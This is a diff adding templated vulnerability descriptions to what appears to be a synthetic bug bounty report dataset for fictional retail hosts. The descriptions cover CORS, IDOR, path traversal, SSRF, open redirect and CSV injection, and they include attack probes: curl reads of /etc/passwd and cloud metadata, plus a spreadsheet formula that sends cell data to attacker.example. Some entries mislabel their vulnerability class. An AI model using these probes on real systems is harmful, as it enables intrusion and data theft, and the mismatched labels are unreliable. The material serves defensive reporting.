+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.zedernfeld-retail.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9131,7 +9198,8 @@
           "offset": "22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9286,7 +9354,8 @@
           "offset": "9d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9373,7 +9442,8 @@
           "offset": "20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9472,7 +9542,8 @@
           "offset": "14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9591,7 +9662,8 @@
           "offset": "1d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9719,7 +9791,8 @@
           "offset": "6d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9851,7 +9924,8 @@
           "offset": "1d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.zedernfeld-retail.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9981,7 +10055,8 @@
           "offset": "5d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10124,7 +10199,8 @@
           "offset": "8d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10271,7 +10347,8 @@
           "offset": "7d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10411,7 +10488,8 @@
           "offset": "4d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10554,7 +10632,8 @@
           "offset": "5d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10665,7 +10744,8 @@
           "offset": "3d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.zedernfeld-retail.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10781,7 +10861,8 @@
           "offset": "10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10921,7 +11002,8 @@
           "offset": "3d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.zedernfeld-retail.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11049,7 +11131,8 @@
           "offset": "9d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11165,7 +11248,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11272,7 +11356,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11382,7 +11467,8 @@
           "offset": "5d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11534,7 +11620,8 @@
           "offset": "5d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11652,7 +11739,8 @@
           "offset": "3d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11784,7 +11872,8 @@
           "offset": "4d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.zedernfeld-retail.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11932,7 +12021,8 @@
           "offset": "2d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12050,7 +12140,8 @@
           "offset": "3d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12222,7 +12313,8 @@
           "offset": "6d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12358,7 +12450,8 @@
           "offset": "4d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12505,7 +12598,8 @@
           "offset": "9d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12637,7 +12731,8 @@
           "offset": "6d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12772,7 +12867,8 @@
           "offset": "6d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12907,7 +13003,8 @@
           "offset": "1d 2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13079,7 +13176,8 @@
           "offset": "6d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
